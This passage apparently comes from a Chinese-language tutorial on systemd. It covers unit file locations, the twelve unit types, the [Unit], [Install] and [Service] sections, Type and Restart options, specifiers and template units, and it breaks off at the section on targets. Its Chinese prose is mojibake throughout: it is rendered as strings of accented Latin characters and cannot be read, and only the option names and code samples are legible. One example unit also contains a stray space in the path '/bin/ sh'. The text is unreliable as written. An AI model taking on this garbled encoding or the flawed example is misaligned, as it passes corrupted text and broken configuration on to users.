çº¦å®šï¼Œåº”è¯¥è¢«æ”¾ç½®æŒ‡å®šçš„ä¸‰ä¸ªç³»ç»Ÿç›®å½•ä¹‹ä¸€ä¸­ã€‚è¿™ä¸‰ä¸ªç›®å½•æ˜¯æœ‰ä¼˜å…ˆçº§çš„ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œè¶Šé ä¸Šçš„ä¼˜å…ˆçº§è¶Šé«˜ã€‚å› æ­¤ï¼Œåœ¨ä¸‰ä¸ªç›®å½•ä¸­æœ‰åŒåæ–‡ä»¶çš„æ—¶å€™ï¼Œåªæœ‰ä¼˜å…ˆçº§æœ€é«˜çš„ç›®å½•é‡Œçš„é‚£ä¸ªæ–‡ä»¶ä¼šè¢«ä½¿ç”¨ã€‚\n\n- /etc/systemd/systemï¼šç³»ç»Ÿæˆ–ç”¨æˆ·è‡ªå®šä¹‰çš„é…ç½®æ–‡ä»¶\n- /run/systemd/systemï¼šè½¯ä»¶è¿è¡Œæ—¶ç”Ÿæˆçš„é…ç½®æ–‡ä»¶\n- /usr/lib/systemd/systemï¼šç³»ç»Ÿæˆ–ç¬¬ä¸‰æ–¹è½¯ä»¶å®‰è£…æ—¶æ·»åŠ çš„é…ç½®æ–‡ä»¶ã€‚\n\nSystemd é»˜è®¤ä»ç›®å½• /etc/systemd/system/ è¯»å–é…ç½®æ–‡ä»¶ã€‚ä½†æ˜¯ï¼Œé‡Œé¢å­˜æ”¾çš„å¤§éƒ¨åˆ†æ–‡ä»¶éƒ½æ˜¯ç¬¦å·é“¾æ¥ï¼ŒæŒ‡å‘ç›®å½• /usr/lib/systemd/system/ï¼ŒçœŸæ­£çš„é…ç½®æ–‡ä»¶å­˜æ”¾åœ¨é‚£ä¸ªç›®å½•ã€‚\n\n\n\n# 2. Unit\n\nSystemd å¯ä»¥ç®¡ç†æ‰€æœ‰ç³»ç»Ÿèµ„æºï¼šå°†ç³»ç»Ÿèµ„æºåˆ’åˆ†ä¸º12ç±»ã€‚å°†æ¯ä¸ªç³»ç»Ÿèµ„æºç§°ä¸ºä¸€ä¸ª Unitã€‚\n\nUnit æ˜¯ Systemd ç®¡ç†ç³»ç»Ÿèµ„æºçš„åŸºæœ¬å•ä½ã€‚ä½¿ç”¨ä¸€ä¸ª Unit File ä½œä¸º Unit çš„å•å…ƒæ–‡ä»¶ï¼ŒSystemd é€šè¿‡å•å…ƒæ–‡ä»¶æ§åˆ¶ Unit çš„å¯åŠ¨ã€‚\n\nä¾‹å¦‚ï¼ŒMySQLæœåŠ¡è¢« Systemd è§†ä¸ºä¸€ä¸ª Unitï¼Œä½¿ç”¨ä¸€ä¸ª mysql.service ä½œä¸ºå¯åŠ¨é…ç½®æ–‡ä»¶\n\n### 2.1 Unit File\n\nSystemd å°†ç³»ç»Ÿèµ„æºåˆ’åˆ†ä¸º12ç±»ï¼Œå¯¹åº”12ç§ç±»å‹çš„å•å…ƒæ–‡ä»¶\n\n| ç³»ç»Ÿèµ„æºç±»å‹ | å•å…ƒæ–‡ä»¶æ‰©å±•å | å•å…ƒæ–‡ä»¶æè¿°                                                 | å¤‡æ³¨                           |\n| ------------ | -------------- | ------------------------------------------------------------ | ------------------------------ |\n| Service      | .service       | å°è£…å®ˆæŠ¤è¿›ç¨‹çš„å¯åŠ¨ã€åœæ­¢ã€é‡å¯å’Œé‡è½½æ“ä½œï¼Œæ˜¯æœ€å¸¸è§çš„ä¸€ç§ Unit æ–‡ä»¶ | ç³»ç»ŸæœåŠ¡                       |\n| Target       | .target        | å®šä¹‰ target ä¿¡æ¯åŠä¾èµ–å…³ç³»ï¼Œä¸€èˆ¬ä»…åŒ…å« Unit æ®µ               | å¤šä¸ª Unit æ„æˆçš„ä¸€ä¸ªç»„         |\n| Device       | .device        | å¯¹äº `/dev` ç›®å½•ä¸‹çš„ç¡¬ä»¶è®¾å¤‡ï¼Œä¸»è¦ç”¨äºå®šä¹‰è®¾å¤‡ä¹‹é—´çš„ä¾èµ–å…³ç³» | ç¡¬ä»¶è®¾å¤‡                       |\n| Mount        | .mount         | å®šä¹‰æ–‡ä»¶ç³»ç»Ÿçš„æŒ‚è½½ç‚¹ï¼Œå¯ä»¥æ›¿ä»£è¿‡å»çš„ `/etc/fstab` é…ç½®æ–‡ä»¶   | æ–‡ä»¶ç³»ç»Ÿçš„æŒ‚è½½ç‚¹               |\n| Automount    | .automount     | ç”¨äºæ§åˆ¶è‡ªåŠ¨æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿï¼Œç›¸å½“äº SysV-init çš„ autofs æœåŠ¡    | è‡ªåŠ¨æŒ‚è½½ç‚¹                     |\n| Path         | .path          | ç”¨äºç›‘æ§æŒ‡å®šç›®å½•æˆ–æ–‡ä»¶çš„å˜åŒ–ï¼Œå¹¶è§¦å‘å…¶å®ƒ Unit è¿è¡Œ           | æ–‡ä»¶æˆ–è·¯å¾„                     |\n| Scope        | .scope         | è¿™ç§ Unit æ–‡ä»¶ä¸æ˜¯ç”¨æˆ·åˆ›å»ºçš„ï¼Œè€Œæ˜¯ Systemd è¿è¡Œæ—¶äº§ç”Ÿçš„ï¼Œæè¿°ä¸€äº›ç³»ç»ŸæœåŠ¡çš„åˆ†ç»„ä¿¡æ¯ | ä¸æ˜¯ç”± Systemd å¯åŠ¨çš„å¤–éƒ¨è¿›ç¨‹  |\n| Slice        | .slice         | ç”¨äºè¡¨ç¤ºä¸€ä¸ª CGroup çš„æ ‘                                     | è¿›ç¨‹ç»„                         |\n| Snapshot     | .snapshot      | ç”¨äºè¡¨ç¤ºä¸€ä¸ªç”± systemctl snapshot å‘½ä»¤åˆ›å»ºçš„ Systemd Units è¿è¡ŒçŠ¶æ€å¿«ç…§ï¼Œå¯ä»¥åˆ‡å›æŸä¸ªå¿«ç…§ | Systemd å¿«ç…§ï¼Œå¯ä»¥åˆ‡å›æŸä¸ªå¿«ç…§ |\n| Socket       | .socket        | ç›‘æ§æ¥è‡ªäºç³»ç»Ÿæˆ–ç½‘ç»œçš„æ•°æ®æ¶ˆæ¯                               | è¿›ç¨‹é—´é€šä¿¡çš„ socket            |\n| Swap         | .swap          | å®šä¹‰ä¸€ä¸ªç”¨æˆ·åšè™šæ‹Ÿå†…å­˜çš„äº¤æ¢åˆ†åŒº                             | swap æ–‡ä»¶                      |\n| Timer        | .timer         | ç”¨äºé…ç½®åœ¨ç‰¹å®šæ—¶é—´è§¦å‘çš„ä»»åŠ¡ï¼Œæ›¿ä»£äº† Crontab çš„åŠŸèƒ½          | å®šæ—¶å™¨                         |\n\nå¯¹äºæ“ä½œå•å…ƒæ–‡ä»¶çš„å‘½ä»¤ï¼Œå¦‚æœç¼ºçœæ‰©å±•åï¼Œåˆ™é»˜è®¤`.service`æ‰©å±•å\n\n### 2.2 è¯­æ³•\n\nå…ˆçœ‹ä¸€ä¸ªç¤ºä¾‹\n\n```ini\n[Unit]\nDescription=Hello World\nAfter=docker.service\nRequires=docker.service\n[Service]\nTimeoutStartSec=0\nExecStartPre=-/usr/bin/docker kill busybox1\nExecStartPre=-/usr/bin/docker rm busybox1\nExecStartPre=/usr/bin/docker pull busybox\nExecStart=/usr/bin/docker run --name busybox1 busybox /bin/ sh -c \"while true; do echo Hello World; sleep 1; done\"\nExecStop=\"/usr/bin/docker stop busybox1\"\nExecStopPost=\"/usr/bin/docker rm busybox1\"\n[Install]\nWantedBy=multi-user.target\n```\n\nUnit æ–‡ä»¶å¯ä»¥åˆ†ä¸ºä¸‰ä¸ªé…ç½®åŒºæ®µï¼š\n\n+ Unit æ®µï¼šæ‰€æœ‰ Unit æ–‡ä»¶é€šç”¨ï¼Œç”¨æ¥å®šä¹‰ Unit çš„å…ƒæ•°æ®ï¼Œä»¥åŠé…ç½®ä¸å…¶ä»– Unit çš„å…³ç³»\n+ Service æ®µï¼šæœåŠ¡ï¼ˆServiceï¼‰ç±»å‹çš„ Unit æ–‡ä»¶ï¼ˆåç¼€ä¸º .serviceï¼‰ç‰¹æœ‰çš„ï¼Œç”¨äºå®šä¹‰æœåŠ¡çš„å…·ä½“ç®¡ç†å’Œæ‰§è¡ŒåŠ¨ä½œ\n+ Install æ®µï¼šæ‰€æœ‰ Unit æ–‡ä»¶é€šç”¨ï¼Œç”¨æ¥å®šä¹‰å¦‚ä½•å¯åŠ¨ï¼Œä»¥åŠæ˜¯å¦å¼€æœºå¯åŠ¨\n\n\n\nUnit å’Œ Install æ®µï¼šæ‰€æœ‰ Unit æ–‡ä»¶é€šç”¨ï¼Œç”¨äºé…ç½®æœåŠ¡ï¼ˆæˆ–å…¶å®ƒç³»ç»Ÿèµ„æºï¼‰çš„æè¿°ã€ä¾èµ–å’Œéšç³»ç»Ÿå¯åŠ¨çš„æ–¹å¼\n\nService æ®µï¼šæœåŠ¡ï¼ˆServiceï¼‰ç±»å‹çš„ Unit æ–‡ä»¶ï¼ˆåç¼€ä¸º .serviceï¼‰ç‰¹æœ‰çš„ï¼Œç”¨äºå®šä¹‰æœåŠ¡çš„å…·ä½“ç®¡ç†å’Œæ“ä½œæ–¹æ³•\n\nå•å…ƒæ–‡ä»¶ä¸­çš„åŒºæ®µåå’Œå­—æ®µåå¤§å°å†™æ•æ„Ÿ, æ¯ä¸ªåŒºæ®µå†…éƒ½æ˜¯ä¸€äº›ç­‰å·è¿æ¥çš„é”®å€¼å¯¹ï¼ˆé”®å€¼å¯¹çš„ç­‰å·ä¸¤ä¾§ä¸èƒ½æœ‰ç©ºæ ¼ï¼‰\n\n\n\n### 2.3 Unit æ®µ\n\nUnit é€šå¸¸æ˜¯é…ç½®æ–‡ä»¶çš„ç¬¬ä¸€ä¸ªåŒºå—ï¼Œç”¨æ¥å®šä¹‰ Unit çš„å…ƒæ•°æ®ï¼Œä»¥åŠé…ç½®ä¸å…¶ä»– Unit çš„å…³ç³»ã€‚\n\n- `Description`ï¼šå½“å‰æœåŠ¡çš„ç®€å•æè¿°\n- `Documentation`ï¼šæ–‡æ¡£åœ°å€ï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡æ¡£çš„ URL è·¯å¾„\n- `Requires`ï¼šä¸å…¶å®ƒ Unit çš„å¼ºä¾èµ–å…³ç³»ï¼Œå¦‚æœå…¶ä¸­ä»»æ„ä¸€ä¸ª Unit å¯åŠ¨å¤±è´¥æˆ–å¼‚å¸¸é€€å‡ºï¼Œå½“å‰ Unit ä¹Ÿä¼šè¢«é€€å‡º\n- `Wants`ï¼šä¸å…¶å®ƒ Unit çš„å¼±ä¾èµ–å…³ç³»ï¼Œå¦‚æœå…¶ä¸­ä»»æ„ä¸€ä¸ª Unit å¯åŠ¨å¤±è´¥æˆ–å¼‚å¸¸é€€å‡ºï¼Œä¸å½±å“å½“å‰ Unit ç»§ç»­æ‰§è¡Œ\n- `After`ï¼šè¯¥å­—æ®µæŒ‡å®šçš„ Unit å…¨éƒ¨å¯åŠ¨å®Œæˆä»¥åï¼Œæ‰ä¼šå¯åŠ¨å½“å‰ Unit\n- `Before`ï¼šè¯¥å­—æ®µæŒ‡å®šçš„ Unit å¿…é¡»åœ¨å½“å‰ Unit å¯åŠ¨å®Œæˆä¹‹åå†å¯åŠ¨\n- `Binds To`ï¼šä¸ Requires ç›¸ä¼¼ï¼Œè¯¥å­—æ®µæŒ‡å®šçš„ Unit å¦‚æœé€€å‡ºï¼Œä¼šå¯¼è‡´å½“å‰ Unit åœæ­¢è¿è¡Œ\n- `Part Of`ï¼šä¸€ä¸ª Bind To ä½œç”¨çš„å­é›†ï¼Œä»…åœ¨åˆ—å‡ºçš„ Unit å¤±è´¥æˆ–é‡å¯æ—¶ï¼Œç»ˆæ­¢æˆ–é‡å¯å½“å‰ Unitï¼Œè€Œä¸ä¼šéšåˆ—å‡ºUnit çš„å¯åŠ¨è€Œå¯åŠ¨\n- `OnFailure`ï¼šå½“è¿™ä¸ªæ¨¡æ¿å¯åŠ¨å¤±è´¥æ—¶ï¼Œå°±ä¼šè‡ªåŠ¨å¯åŠ¨åˆ—å‡ºçš„æ¯ä¸ªæ¨¡å—\n- `Conflicts`ï¼šä¸è¿™ä¸ªæ¨¡å—æœ‰å†²çªçš„æ¨¡å—ï¼Œå¦‚æœåˆ—å‡ºçš„æ¨¡å—ä¸­æœ‰å·²ç»åœ¨è¿è¡Œçš„ï¼Œè¿™ä¸ªæœåŠ¡å°±ä¸èƒ½å¯åŠ¨ï¼Œåä¹‹äº¦ç„¶\n\n\n\n### 2.4 Installæ®µ\n\nInstallé€šå¸¸æ˜¯é…ç½®æ–‡ä»¶çš„æœ€åä¸€ä¸ªåŒºå—ï¼Œç”¨æ¥å®šä¹‰å¦‚ä½•å¯åŠ¨ï¼Œä»¥åŠæ˜¯å¦å¼€æœºå¯åŠ¨ã€‚\n\n- `WantedBy`ï¼šå®ƒçš„å€¼æ˜¯ä¸€ä¸ªæˆ–å¤šä¸ª targetï¼Œæ‰§è¡Œenableå‘½ä»¤æ—¶ï¼Œç¬¦å·é“¾æ¥ä¼šæ”¾å…¥`/etc/systemd/system`ç›®å½•ä¸‹ä»¥ target å + `.wants`åç¼€æ„æˆçš„å­ç›®å½•ä¸­\n\n- `RequiredBy`ï¼šå®ƒçš„å€¼æ˜¯ä¸€ä¸ªæˆ–å¤šä¸ª targetï¼Œæ‰§è¡Œenableå‘½ä»¤æ—¶ï¼Œç¬¦å·é“¾æ¥ä¼šæ”¾å…¥`/etc/systemd/system`ç›®å½•ä¸‹ä»¥ target å + `.required`åç¼€æ„æˆçš„å­ç›®å½•ä¸­\n\n- `Alias`ï¼šå½“å‰ Unit å¯ç”¨äºå¯åŠ¨çš„åˆ«å\n\n- `Also`ï¼šå½“å‰ Unit è¢« enable/disable æ—¶ï¼Œä¼šè¢«åŒæ—¶æ“ä½œçš„å…¶ä»– Unit\n\n  \n\n### 2.5 Serviceæ®µ\n\nService ç”¨æ¥ Service çš„é…ç½®ï¼Œåªæœ‰ Service ç±»å‹çš„ Unit æ‰æœ‰è¿™ä¸ªåŒºå—ã€‚\n\n##### 2.5.1 å¯åŠ¨ç±»å‹\n\n+ Typeï¼šå®šä¹‰å¯åŠ¨æ—¶çš„è¿›ç¨‹è¡Œä¸ºã€‚å®ƒæœ‰ä»¥ä¸‹å‡ ç§å€¼ã€‚\n\n  **Type=simple**ï¼šé»˜è®¤å€¼ï¼ŒExecStartå­—æ®µå¯åŠ¨çš„è¿›ç¨‹ä¸ºä¸»è¿›ç¨‹\n  æœåŠ¡è¿›ç¨‹ä¸ä¼š forkï¼Œå¦‚æœè¯¥æœåŠ¡è¦å¯åŠ¨å…¶ä»–æœåŠ¡ï¼Œä¸è¦ä½¿ç”¨æ­¤ç±»å‹å¯åŠ¨ï¼Œé™¤éè¯¥æœåŠ¡æ˜¯ socket æ¿€æ´»å‹\n\n  **Type=forking**ï¼šExecStartå­—æ®µå°†ä»¥fork()æ–¹å¼ä»çˆ¶è¿›ç¨‹åˆ›å»ºå­è¿›ç¨‹å¯åŠ¨ï¼Œåˆ›å»ºåçˆ¶è¿›ç¨‹ä¼šç«‹å³é€€å‡ºï¼Œå­è¿›ç¨‹æˆä¸ºä¸»è¿›ç¨‹ã€‚\n  é€šå¸¸éœ€è¦æŒ‡å®šPIDFileå­—æ®µï¼Œä»¥ä¾¿ Systemd èƒ½å¤Ÿè·Ÿè¸ªæœåŠ¡çš„ä¸»è¿›ç¨‹\n\n  å¯¹äºå¸¸è§„çš„å®ˆæŠ¤è¿›ç¨‹ï¼ˆdaemonï¼‰ï¼Œé™¤éä½ ç¡®å®šæ­¤å¯åŠ¨æ–¹å¼æ— æ³•æ»¡è¶³éœ€æ±‚ï¼Œä½¿ç”¨æ­¤ç±»å‹å¯åŠ¨å³å¯\n\n  **Type=oneshot**ï¼šåªæ‰§è¡Œä¸€æ¬¡ï¼ŒSystemd ä¼šç­‰å½“å‰æœåŠ¡é€€å‡ºï¼Œå†ç»§ç»­å¾€ä¸‹æ‰§è¡Œ, é€‚ç”¨äºåªæ‰§è¡Œä¸€é¡¹ä»»åŠ¡ã€éšåç«‹å³é€€å‡ºçš„æœåŠ¡\n  é€šå¸¸éœ€è¦æŒ‡å®šRemainAfterExit=yeså­—æ®µï¼Œä½¿å¾— Systemd åœ¨æœåŠ¡è¿›ç¨‹é€€å‡ºä¹‹åä»ç„¶è®¤ä¸ºæœåŠ¡å¤„äºæ¿€æ´»çŠ¶æ€\n\n  **Type=dbus**ï¼šå½“å‰æœåŠ¡é€šè¿‡ D-Bus ä¿¡å·å¯åŠ¨ã€‚å½“æŒ‡å®šçš„ BusName å‡ºç°åœ¨ DBus ç³»ç»Ÿæ€»çº¿ä¸Šæ—¶ï¼ŒSystemdè®¤ä¸ºæœåŠ¡å°±ç»ª\n\n  **Type=notify**ï¼šå½“å‰æœåŠ¡å¯åŠ¨å®Œæ¯•ä¼šå‘å‡ºé€šçŸ¥ä¿¡å·ï¼Œé€šçŸ¥ Systemdï¼Œç„¶å Systemd å†å¯åŠ¨å…¶ä»–æœåŠ¡\n\n  **Type=idle**ï¼šSystemd ä¼šç­‰åˆ°å…¶ä»–ä»»åŠ¡éƒ½æ‰§è¡Œå®Œï¼Œæ‰ä¼šå¯åŠ¨è¯¥æœåŠ¡ã€‚ä¸€ç§ä½¿ç”¨åœºåˆæ˜¯ï¼šè®©è¯¥æœåŠ¡çš„è¾“å‡ºï¼Œä¸ä¸å…¶ä»–æœåŠ¡çš„è¾“å‡ºç›¸æ··åˆ\n##### 2.5.2 å¯åŠ¨è¡Œä¸º\n\n+ `ExecStart`ï¼šå¯åŠ¨å½“å‰æœåŠ¡çš„å‘½ä»¤\n\n  ```bash\n  ExecStart=/bin/echo execstart1\n  ExecStart=\n  ExecStart=/bin/echo execstart2\n  ```\n\n  é¡ºåºæ‰§è¡Œè®¾å®šçš„å‘½ä»¤ï¼ŒæŠŠå­—æ®µç½®ç©ºï¼Œè¡¨ç¤ºæ¸…é™¤ä¹‹å‰çš„å€¼\n\n- `ExecStartPre`ï¼šå¯åŠ¨å½“å‰æœåŠ¡ä¹‹å‰æ‰§è¡Œçš„å‘½ä»¤\n- `ExecStartPost`ï¼šå¯åŠ¨å½“å‰æœåŠ¡ä¹‹åæ‰§è¡Œçš„å‘½ä»¤\n- `ExecReload`ï¼šé‡å¯å½“å‰æœåŠ¡æ—¶æ‰§è¡Œçš„å‘½ä»¤\n- `ExecStop`ï¼šåœæ­¢å½“å‰æœåŠ¡æ—¶æ‰§è¡Œçš„å‘½ä»¤\n- `ExecStopPost`ï¼šåœæ­¢å½“å‰æœåŠ¡ä¹‹åæ‰§è¡Œçš„å‘½ä»¤\n- `RemainAfterExit`ï¼šå½“å‰æœåŠ¡çš„æ‰€æœ‰è¿›ç¨‹éƒ½é€€å‡ºçš„æ—¶å€™ï¼ŒSystemd ä»è®¤ä¸ºè¯¥æœåŠ¡æ˜¯æ¿€æ´»çŠ¶æ€, è¿™ä¸ªé…ç½®ä¸»è¦æ˜¯æä¾›ç»™ä¸€äº›å¹¶éå¸¸é©»å†…å­˜ï¼Œè€Œæ˜¯å¯åŠ¨æ³¨å†Œåç«‹å³é€€å‡ºï¼Œç„¶åç­‰å¾…æ¶ˆæ¯æŒ‰éœ€å¯åŠ¨çš„ç‰¹æ®Šç±»å‹æœåŠ¡ä½¿ç”¨çš„\n\n+ `TimeoutSec`ï¼šå®šä¹‰ Systemd åœæ­¢å½“å‰æœåŠ¡ä¹‹å‰ç­‰å¾…çš„ç§’æ•°\n\n##### 2.5.3 é‡å¯è¡Œä¸º\n\n+ `RestartSec`ï¼šSystemd é‡å¯å½“å‰æœåŠ¡é—´éš”çš„ç§’æ•°\n+ `KillMode`ï¼šå®šä¹‰ Systemd å¦‚ä½•åœæ­¢æœåŠ¡ï¼Œå¯èƒ½çš„å€¼åŒ…æ‹¬ï¼š\n  control-groupï¼ˆé»˜è®¤å€¼ï¼‰ï¼šå½“å‰æ§åˆ¶ç»„é‡Œé¢çš„æ‰€æœ‰å­è¿›ç¨‹ï¼Œéƒ½ä¼šè¢«æ€æ‰\n  processï¼šåªæ€ä¸»è¿›ç¨‹ï¼ˆsshd æœåŠ¡ï¼Œæ¨èå€¼ï¼‰\n  mixedï¼šä¸»è¿›ç¨‹å°†æ”¶åˆ° SIGTERM ä¿¡å·ï¼Œå­è¿›ç¨‹æ”¶åˆ° SIGKILL ä¿¡å·\n  noneï¼šæ²¡æœ‰è¿›ç¨‹ä¼šè¢«æ€æ‰ï¼Œåªæ˜¯æ‰§è¡ŒæœåŠ¡çš„ stop å‘½ä»¤ã€‚\n+ `Restart`ï¼šå®šä¹‰ä½•ç§æƒ…å†µ Systemd ä¼šè‡ªåŠ¨é‡å¯å½“å‰æœåŠ¡ï¼Œå¯èƒ½çš„å€¼åŒ…æ‹¬ï¼š\n  noï¼ˆé»˜è®¤å€¼ï¼‰ï¼šé€€å‡ºåä¸ä¼šé‡å¯\n  on-successï¼šåªæœ‰æ­£å¸¸é€€å‡ºæ—¶ï¼ˆé€€å‡ºçŠ¶æ€ç ä¸º0ï¼‰ï¼Œæ‰ä¼šé‡å¯\n  on-failureï¼šéæ­£å¸¸é€€å‡ºæ—¶ï¼ˆé€€å‡ºçŠ¶æ€ç é0ï¼‰ï¼ŒåŒ…æ‹¬è¢«ä¿¡å·ç»ˆæ­¢å’Œè¶…æ—¶ï¼Œæ‰ä¼šé‡å¯ï¼ˆå®ˆæŠ¤è¿›ç¨‹ï¼Œæ¨èå€¼ï¼‰\n  on-abnormalï¼šåªæœ‰è¢«ä¿¡å·ç»ˆæ­¢å’Œè¶…æ—¶ï¼Œæ‰ä¼šé‡å¯ï¼ˆå¯¹äºå…è®¸å‘ç”Ÿé”™è¯¯é€€å‡ºçš„æœåŠ¡ï¼Œæ¨èå€¼ï¼‰\n  on-abortï¼šåªæœ‰åœ¨æ”¶åˆ°æ²¡æœ‰æ•æ‰åˆ°çš„ä¿¡å·ç»ˆæ­¢æ—¶ï¼Œæ‰ä¼šé‡å¯\n  on-watchdogï¼šè¶…æ—¶é€€å‡ºï¼Œæ‰ä¼šé‡å¯\n  alwaysï¼šä¸ç®¡æ˜¯ä»€ä¹ˆé€€å‡ºåŸå› ï¼Œæ€»æ˜¯é‡å¯\n\n##### 2.5.4 ä¸Šä¸‹æ–‡\n\n- `PIDFile`ï¼šæŒ‡å‘å½“å‰æœåŠ¡ PID file çš„ç»å¯¹è·¯å¾„ã€‚\n\n- `User`ï¼šæŒ‡å®šè¿è¡ŒæœåŠ¡çš„ç”¨æˆ·\n\n- `Group`ï¼šæŒ‡å®šè¿è¡ŒæœåŠ¡çš„ç”¨æˆ·ç»„\n\n- `EnvironmentFile`ï¼šæŒ‡å®šå½“å‰æœåŠ¡çš„ç¯å¢ƒå‚æ•°æ–‡ä»¶ã€‚è¯¥æ–‡ä»¶å†…éƒ¨çš„`key=value`é”®å€¼å¯¹ï¼Œå¯ä»¥ç”¨`$key`çš„å½¢å¼ï¼Œåœ¨å½“å‰é…ç½®æ–‡ä»¶ä¸­è·å–\n\n  å¯åŠ¨`sshd`ï¼Œæ‰§è¡Œçš„å‘½ä»¤æ˜¯`/usr/sbin/sshd -D $OPTIONS`ï¼Œå…¶ä¸­çš„å˜é‡`$OPTIONS`å°±æ¥è‡ª`EnvironmentFile`å­—æ®µæŒ‡å®šçš„ç¯å¢ƒå‚æ•°æ–‡ä»¶ã€‚\n  \n### 2.6 å ä½ç¬¦\n\nåœ¨ Unit æ–‡ä»¶ä¸­ï¼Œæœ‰æ—¶ä¼šéœ€è¦ä½¿ç”¨åˆ°ä¸€äº›ä¸è¿è¡Œç¯å¢ƒæœ‰å…³çš„ä¿¡æ¯ï¼Œä¾‹å¦‚èŠ‚ç‚¹ IDã€è¿è¡ŒæœåŠ¡çš„ç”¨æˆ·ç­‰ã€‚è¿™äº›ä¿¡æ¯å¯ä»¥ä½¿ç”¨å ä½ç¬¦æ¥è¡¨ç¤ºï¼Œç„¶ååœ¨å®é™…è¿è¡Œä¸­åŠ¨æ€åœ°æ›¿æ¢ä¸ºå®é™…çš„å€¼ã€‚\n\n- %nï¼šå®Œæ•´çš„ Unit æ–‡ä»¶åå­—ï¼ŒåŒ…æ‹¬ .service åç¼€å\n- %pï¼šUnit æ¨¡æ¿æ–‡ä»¶åä¸­ @ ç¬¦å·ä¹‹å‰çš„éƒ¨åˆ†ï¼Œä¸åŒ…æ‹¬ @ ç¬¦å·\n- %iï¼šUnit æ¨¡æ¿æ–‡ä»¶åä¸­ @ ç¬¦å·ä¹‹åçš„éƒ¨åˆ†ï¼Œä¸åŒ…æ‹¬ @ ç¬¦å·å’Œ .service åç¼€å\n- %tï¼šå­˜æ”¾ç³»ç»Ÿè¿è¡Œæ–‡ä»¶çš„ç›®å½•ï¼Œé€šå¸¸æ˜¯ â€œrunâ€\n- %uï¼šè¿è¡ŒæœåŠ¡çš„ç”¨æˆ·ï¼Œå¦‚æœ Unit æ–‡ä»¶ä¸­æ²¡æœ‰æŒ‡å®šï¼Œåˆ™é»˜è®¤ä¸º root\n- %Uï¼šè¿è¡ŒæœåŠ¡çš„ç”¨æˆ· ID\n- %hï¼šè¿è¡ŒæœåŠ¡çš„ç”¨æˆ· Home ç›®å½•ï¼Œå³ %{HOME} ç¯å¢ƒå˜é‡çš„å€¼\n- %sï¼šè¿è¡ŒæœåŠ¡çš„ç”¨æˆ·é»˜è®¤ Shell ç±»å‹ï¼Œå³ %{SHELL} ç¯å¢ƒå˜é‡çš„å€¼\n- %mï¼šå®é™…è¿è¡ŒèŠ‚ç‚¹çš„ Machine IDï¼Œå¯¹äºè¿è¡Œä½ç½®æ¯ä¸ªçš„æœåŠ¡æ¯”è¾ƒæœ‰ç”¨\n- %bï¼šBoot IDï¼Œè¿™æ˜¯ä¸€ä¸ªéšæœºæ•°ï¼Œæ¯ä¸ªèŠ‚ç‚¹å„ä¸ç›¸åŒï¼Œå¹¶ä¸”æ¯æ¬¡èŠ‚ç‚¹é‡å¯æ—¶éƒ½ä¼šæ”¹å˜\n- %Hï¼šå®é™…è¿è¡ŒèŠ‚ç‚¹çš„ä¸»æœºå\n- %vï¼šå†…æ ¸ç‰ˆæœ¬ï¼Œå³ â€œuname -râ€ å‘½ä»¤è¾“å‡ºçš„å†…å®¹\n- %%ï¼šåœ¨ Unit æ¨¡æ¿æ–‡ä»¶ä¸­è¡¨ç¤ºä¸€ä¸ªæ™®é€šçš„ç™¾åˆ†å·\n\n\n\n### 2.7 æ¨¡æ¿\n\nåœ¨ç°å®ä¸­ï¼Œå¾€å¾€æœ‰ä¸€äº›åº”ç”¨éœ€è¦è¢«å¤åˆ¶å¤šä»½è¿è¡Œï¼Œå°±ä¼šç”¨åˆ°æ¨¡æ¿æ–‡ä»¶\n\næ¨¡æ¿æ–‡ä»¶çš„å†™æ³•ä¸æ™®é€šå•å…ƒæ–‡ä»¶åŸºæœ¬ç›¸åŒï¼Œåªæ˜¯æ¨¡æ¿æ–‡ä»¶åæ˜¯ä»¥ @ ç¬¦å·ç»“å°¾ã€‚ä¾‹å¦‚ï¼šapache@.service\n\né€šè¿‡æ¨¡æ¿æ–‡ä»¶å¯åŠ¨æœåŠ¡å®ä¾‹æ—¶ï¼Œéœ€è¦åœ¨å…¶æ–‡ä»¶åçš„ @ å­—ç¬¦åé¢é™„åŠ ä¸€ä¸ªç”¨äºåŒºåˆ†æœåŠ¡å®ä¾‹çš„å‚æ•°å­—ç¬¦ä¸²ï¼Œé€šå¸¸è¿™ä¸ªå‚æ•°æ˜¯ç”¨äºç›‘æ§çš„ç«¯å£å·æˆ–æ§åˆ¶å° TTY ç¼–è¯‘å·\n\n```bash\nsystemctl start apache@8080.service\n```\n\nSystemd åœ¨è¿è¡ŒæœåŠ¡æ—¶ï¼Œé¦–å…ˆå¯»æ‰¾è·Ÿå•å…ƒåå®Œå…¨åŒ¹é…çš„å•å…ƒæ–‡ä»¶ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œæ‰ä¼šå°è¯•é€‰æ‹©åŒ¹é…æ¨¡æ¿\n\nä¾‹å¦‚ä¸Šé¢çš„å‘½ä»¤ï¼ŒSystem é¦–å…ˆä¼šåœ¨çº¦å®šçš„ç›®å½•ä¸‹å¯»æ‰¾åä¸º apache@8080.service çš„å•å…ƒæ–‡ä»¶ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œè€Œæ–‡ä»¶åä¸­åŒ…å« @ å­—ç¬¦ï¼Œå®ƒå°±ä¼šå°è¯•å»æ‰åç¼€å‚æ•°åŒ¹é…æ¨¡æ¿æ–‡ä»¶ã€‚å¯¹äº apache@8080.serviceï¼ŒSystemd ä¼šæ‰¾åˆ° apache@.service æ¨¡æ¿æ–‡ä»¶ï¼Œå¹¶é€šè¿‡è¿™ä¸ªæ¨¡æ¿æ–‡ä»¶å°†æœåŠ¡å®ä¾‹åŒ–ã€‚\n\n\n\n# 3. Target\n\nTarget å°±æ˜¯ä¸€ä¸ª Unit ç»„ï¼ŒåŒ…å«è®¸å¤šç›¸å…³çš„ Unit ã€‚å¯åŠ¨æŸä¸ª Target çš„æ—¶å€™ï¼ŒSystemd å°±ä¼šå¯åŠ¨é‡Œé¢æ‰€æœ‰çš„ Unitã€‚ä»è¿™ä¸ªæ„ä¹‰ä¸Šè¯´ï¼ŒTarget è¿™ä¸ªæ¦‚å¿µç±»ä¼¼äº\"çŠ¶æ€ç‚¹\"ï¼Œå¯åŠ¨æŸä¸ª Target å°±å¥½æ¯”å¯åŠ¨åˆ°æŸç§çŠ¶æ€ã€‚\n\nåœ¨ä¼ ç»Ÿçš„ SysV-init å¯åŠ¨æ¨¡å¼é‡Œé¢ï¼Œæœ‰ RunLevel 